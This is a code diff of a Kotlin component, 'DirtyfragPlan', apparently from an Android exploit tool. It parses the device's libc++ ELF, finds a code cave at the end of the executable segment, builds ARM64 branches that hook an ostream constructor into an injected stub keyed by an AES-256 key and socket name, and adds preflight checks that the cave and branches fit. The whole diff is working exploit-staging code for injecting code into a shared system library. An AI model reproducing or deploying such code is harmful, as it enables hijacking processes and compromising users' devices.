@@ -21,12 +21,104 @@ object DirtyfragPlan {
     private const val STUB_CODE_OFFSET = 0x4c
     private const val STUB_FIRST_INS_OFFSET = 0x19c
     private const val STUB_RETURN_OFFSET = 0x1a0
+    private const val CAVE_PAGE_BYTES = 0x1000L
     private const val SENTRY_SYMBOL =
         "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_"
 
-    private class Segment(val offset: Long, val vaddr: Long, val filesz: Long)
+    private class Segment(
+        val offset: Long,
+        val vaddr: Long,
+        val filesz: Long,
+        val flags: Int,
+    )
 
     private class Block(val base: Long, val current: ByteArray, val desired: ByteArray)
+
+    /** The ELF facts the cave check needs, independent of the stub/key. */
+    internal data class CaveLayout(
+        val execOffset: Long,
+        val execFilesz: Long,
+        val hook: Long,
+        val fileLength: Long,
+    )
+
+    /** Structural preflight of the running ROM's libc++ for the stage. */
+    internal data class DirtyfragPreflight(
+        val feasible: Boolean,
+        val reasons: List<String>,
+        val details: String,
+    )
+
+    /**
+     * The pure cave/layout rules. The cave is the byte after the executable
+     * segment's file data, inside that segment's **last 4 KiB page**: the
+     * loader's executable mapping of that page is what runs the stub, so the
+     * blob must fit the page remainder (the 420 B stub against the stage-1
+     * 2520/640 B margins). The RW segment's bytes share the same page-cache
+     * page by design (its `.data.rel.ro` alias is COWed in live processes), so
+     * a shared page is not an error; a cave at a page boundary has no
+     * executable page and is rejected. Both branch displacements must fit the
+     * ARM64 B range.
+     */
+    internal fun checkCave(layout: CaveLayout, blobSize: Int): List<String> {
+        val reasons = mutableListOf<String>()
+        val cave = layout.execOffset + layout.execFilesz
+        val caveEnd = cave + blobSize
+        if (cave < 0 || caveEnd > layout.fileLength) {
+            reasons += "cave outside the file (cave=$cave end=$caveEnd file=${layout.fileLength})"
+        }
+        if (layout.hook < 0 || layout.hook + 4 > layout.fileLength) {
+            reasons += "hook outside the file (hook=${layout.hook} file=${layout.fileLength})"
+        }
+        val pageOffset = cave and (CAVE_PAGE_BYTES - 1)
+        if (pageOffset == 0L) {
+            reasons += "cave starts at a page boundary; no executable page for the stub"
+        } else {
+            val remain = CAVE_PAGE_BYTES - pageOffset
+            if (remain < blobSize) {
+                reasons += "cave page remainder $remain < stub $blobSize"
+            }
+        }
+        if (!branchFits(layout.hook, cave + STUB_CODE_OFFSET)) {
+            reasons += "hook branch out of range"
+        }
+        if (!branchFits(cave + STUB_RETURN_OFFSET, layout.hook + 4)) {
+            reasons += "return branch out of range"
+        }
+        return reasons
+    }
+
+    internal fun branchFits(from: Long, to: Long): Boolean {
+        val delta = to - from
+        return delta % 4 == 0L && delta >= -(1L shl 27) && delta < (1L shl 27)
+    }
+
+    /** Structural check of the running ROM's libc++; callable before W1. */
+    internal fun preflight(context: Context, lib: File): DirtyfragPreflight {
+        val reasons = mutableListOf<String>()
+        var details = ""
+        try {
+            val blob = context.assets.open(STUB_ASSET).use { it.readBytes() }
+            if (blob.size < STUB_RETURN_OFFSET + 4) {
+                reasons += "stub asset truncated (${blob.size} B)"
+            }
+            RandomAccessFile(lib, "r").use { elf ->
+                val segments = loadSegments(elf)
+                val exec = execSegment(segments)
+                val hook = hookOffset(elf, exec)
+                val cave = exec.offset + exec.filesz
+                val layout = CaveLayout(exec.offset, exec.filesz, hook, elf.length())
+                reasons += checkCave(layout, blob.size)
+                readInt(elf, hook)
+                val remain = CAVE_PAGE_BYTES - (cave and (CAVE_PAGE_BYTES - 1))
+                details = "lib=${lib.absolutePath} cave=$cave page_remain=$remain " +
+                    "blob=${blob.size} hook=$hook file=${elf.length()}"
+            }
+        } catch (t: Throwable) {
+            reasons += "${t::class.simpleName}: ${t.message}"
+        }
+        return DirtyfragPreflight(reasons.isEmpty(), reasons, details)
+    }
 
     /** Writes the control file and returns it. */
     fun build(
@@ -42,7 +134,7 @@ object DirtyfragPlan {
         require(key.size == 32) { "AES-256 key must be 32 bytes" }
         require(socketName.length == 8) { "abstract socket name must be 8 bytes" }
         RandomAccessFile(lib, "r").use { elf ->
-            val exec = execSegment(elf)
+            val exec = execSegment(loadSegments(elf))
             val hook = hookOffset(elf, exec)
             val cave = exec.offset + exec.filesz
             val blob = context.assets.open(STUB_ASSET).use { it.readBytes() }
@@ -99,12 +191,13 @@ object DirtyfragPlan {
         return ByteArray(16) { i -> (decrypted[i].toInt() xor desired[i].toInt()).toByte() }
     }
 
-    private fun execSegment(elf: RandomAccessFile): Segment {
+    private fun loadSegments(elf: RandomAccessFile): List<Segment> {
         elf.seek(0x20)
         val phoff = readLong(elf)
         elf.seek(0x36)
         val phentsize = readShort(elf).toInt()
         val phnum = readShort(elf).toInt()
+        val segments = ArrayList<Segment>(phnum)
         for (i in 0 until phnum) {
             elf.seek(phoff + i.toLong() * phentsize)
             val type = readInt(elf)
@@ -113,10 +206,14 @@ object DirtyfragPlan {
             val vaddr = readLong(elf)
             readLong(elf) // p_paddr
             val filesz = readLong(elf)
-            if (type == 1 && (flags and 1) != 0) return Segment(offset, vaddr, filesz)
+            if (type == 1) segments += Segment(offset, vaddr, filesz, flags)
         }
-        error("no executable PT_LOAD in ${elf.fd}")
+        return segments
     }
+
+    private fun execSegment(segments: List<Segment>): Segment =
+        segments.firstOrNull { it.flags and 1 != 0 }
+            ?: error("no executable PT_LOAD")
 
     private fun hookOffset(elf: RandomAccessFile, exec: Segment): Long {
         elf.seek(0x28)
@@ -243,8 +340,8 @@ object DirtyfragPlan {
     }
 
     private fun branch(from: Long, to: Long): Int {
+        require(branchFits(from, to)) { "branch out of range: ${to - from}" }
         val delta = (to - from).toInt()
-        require(delta and 3 == 0) { "unaligned branch" }
         return 0x14000000.toInt() or ((delta shr 2) and 0x03FFFFFF)
     }
 
